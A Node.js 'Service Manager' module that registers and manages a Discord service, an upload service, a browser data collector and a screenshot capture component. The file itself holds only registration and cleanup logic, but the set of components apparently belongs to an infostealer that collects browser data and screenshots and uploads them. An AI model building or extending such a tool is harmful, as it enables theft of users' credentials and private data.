/**
 * Service Manager Module
 * Manages and coordinates all application services
 */

const { DiscordService } = require('../services/discord/service');
const { uploadService } = require('../services/upload/service');
const { BrowserCollector } = require('../modules/browsers/collector');
const { ScreenshotCapture } = require('../modules/screenshot/capture');
const { logger } = require('./logger');

class ServiceManager {
    constructor() {
        this.services = {};
        this.initialized = false;
    }

    /**
     * Initialize all services
     */
    async initialize() {
        try {
            logger.info('Initializing service manager');

            // Initialize core services
            this.services.discord = new DiscordService();
            this.services.upload = uploadService;
            this.services.browserCollector = new BrowserCollector();
            this.services.screenshot = new ScreenshotCapture();

            this.initialized = true;
            logger.info('Service manager initialized successfully');
        } catch (error) {
            logger.error('Failed to initialize service manager', error.message);
            throw error;
        }
    }

    /**
     * Get a service by name
     * @param {string} serviceName - Name of the service
     * @returns {Object} Service instance
     */
    getService(serviceName) {
        if (!this.initialized) {
            throw new Error('Service manager not initialized');
        }

        if (!this.services[serviceName]) {
            throw new Error(`Service '${serviceName}' not found`);
        }

        return this.services[serviceName];
    }

    /**
     * Check if service is available
     * @param {string} serviceName - Name of the service
     * @returns {boolean} Service availability
     */
    hasService(serviceName) {
        return this.initialized && !!this.services[serviceName];
    }

    /**
     * Get all available services
     * @returns {Array<string>} Array of service names
     */
    getAvailableServices() {
        return Object.keys(this.services);
    }

    /**
     * Cleanup all services
     */
    async cleanup() {
        try {
            logger.info('Cleaning up services');

            // Cleanup screenshot service
            if (this.services.screenshot) {
                this.services.screenshot.cleanup();
            }

            logger.info('Services cleanup completed');
        } catch (error) {
            logger.error('Failed to cleanup services', error.message);
        }
    }
}

// Create and export singleton instance
const serviceManager = new ServiceManager();

module.exports = {
    ServiceManager,
    serviceManager
};